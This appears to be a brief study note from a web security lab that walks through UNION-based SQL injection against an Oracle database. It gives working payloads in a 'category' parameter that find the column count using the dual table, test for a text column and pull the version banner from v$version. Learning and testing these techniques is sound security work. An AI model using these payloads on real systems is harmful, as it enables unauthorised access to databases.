1) we need to understand how much column has the current table we are querying so we have to use:
    category=Pets' union select null from dual --

    but we obtain internal server error so we use ' union select null, null from dual --
    ok

2) we need to understand if one of these two columns is text so we can do:
    ' union select "hello", null from dual --
    ok

3) so now we can obtain the information we need
    ' union select BANNER, null from v$version --

    BANNER column has the information we need form the table v$version of oracle


dual is a default table of oracle we can use in this case to understand how much columns the table on which we are doing the initial query has.
This beacuse the union can be done only on tables of the same number of columns and we can retrieve only the same type of data, so we need to search also the column that is text
